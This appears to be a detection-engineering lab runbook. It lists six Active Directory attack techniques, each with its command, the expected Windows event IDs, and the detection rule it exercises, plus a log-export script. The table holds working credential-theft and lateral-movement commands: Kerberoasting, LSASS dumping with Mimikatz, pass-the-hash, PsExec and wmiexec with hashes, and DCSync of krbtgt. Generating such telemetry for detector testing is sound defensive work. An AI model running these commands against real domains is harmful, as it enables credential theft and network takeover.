# Attack runbook

Run each step from a fresh snapshot, note the timestamp, then export logs with `scripts/export_lab_logs.ps1`.

| # | Technique | How (lab only) | Expected events | Rule |
|---|---|---|---|---|
| 1 | T1558.003 Kerberoasting | `Invoke-AtomicTest T1558.003 -TestNumbers 1` (Rubeus) or from Kali: `GetUserSPNs.py lab.local/jdoe -request -dc-ip 10.0.0.10` | Security 4769, enc type 0x17 | `kerberoasting_rc4_tgs` |
| 2 | T1003.001 LSASS dump | `Invoke-AtomicTest T1003.001 -TestNumbers 1,2` (procdump, comsvcs MiniDump) and Mimikatz `sekurlsa::logonpasswords` | Sysmon 10 to lsass.exe | `lsass_suspicious_access` |
| 3 | T1550.002 Pass-the-Hash | Mimikatz `sekurlsa::pth /user:svc_sql /domain:lab.local /ntlm:<hash>` or `Invoke-AtomicTest T1550.002` | Security 4624, type 9, seclogo | `pass_the_hash_seclogo` |
| 4 | T1569.002 PsExec | `PsExec.exe \\srv01 cmd` and from Kali `psexec.py lab/svc_sql@10.0.0.30 -hashes :<hash>` | System 7045 | `psexec_service_install` |
| 5 | T1047 WMI | From Kali `wmiexec.py lab/svc_sql@10.0.0.30 -hashes :<hash>` or `Invoke-AtomicTest T1047 -TestNumbers 5` | Sysmon 1, parent WmiPrvSE | `wmi_remote_exec_shell` |
| 6 | T1003.006 DCSync | Grant jdoe replication rights (simulating compromise), then Mimikatz `lsadump::dcsync /user:lab\krbtgt` or `secretsdump.py -just-dc` | Security 4662 on DC01 | `dcsync_replication` |

Export example:
```powershell
.\scripts\export_lab_logs.ps1 -Rule kerberoasting_rc4_tgs -Kind attack -Log Security -Id 4769 -Minutes 15
.\scripts\export_lab_logs.ps1 -Rule lsass_suspicious_access -Kind attack -Log Microsoft-Windows-Sysmon/Operational -Id 10 -Minutes 15
```
Review each file and remove events unrelated to the attack before committing (they belong in benign.jsonl instead).
